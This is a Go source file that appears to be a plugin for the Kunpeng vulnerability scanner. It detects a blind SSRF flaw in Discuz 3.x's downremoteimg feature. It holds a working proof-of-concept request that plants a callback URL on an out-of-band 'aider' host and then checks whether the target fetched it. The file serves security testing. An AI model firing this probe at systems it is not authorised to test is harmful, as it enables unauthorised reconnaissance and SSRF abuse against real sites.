package goplugin

import (
	"fmt"
	"net/http"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type discuzSSRF struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("discuz", &discuzSSRF{})
}
func (d *discuzSSRF) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Discuz 3.X SSRF",
		Remarks: "Disucz 3.x downremoteimg 功能存在Blind SSRF漏洞",
		Level:   2,
		Type:    "SSRF",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.seebug.org/vuldb/ssvid-91879",
			KPID: "KP-0010",
		},
	}
	return d.info
}
func (d *discuzSSRF) GetResult() []plugin.Plugin {
	return d.result
}
func (d *discuzSSRF) Check(URL string, meta plugin.TaskMeta) bool {
	if util.GetAiderNetloc() == "" {
		return false
	}
	rand := util.GetRandomString(5)
	aiderURL := fmt.Sprintf("%s/add/%s", util.GetAiderNetloc(), rand)
	poc := "/forum.php?mod=ajax&action=downremoteimg&message=forum.php?mod=ajax&action=downremoteimg&message=[img]" +
		aiderURL + "[/img]"
	request, err := http.NewRequest("GET", URL+poc, nil)
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if util.AiderCheck(rand) {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
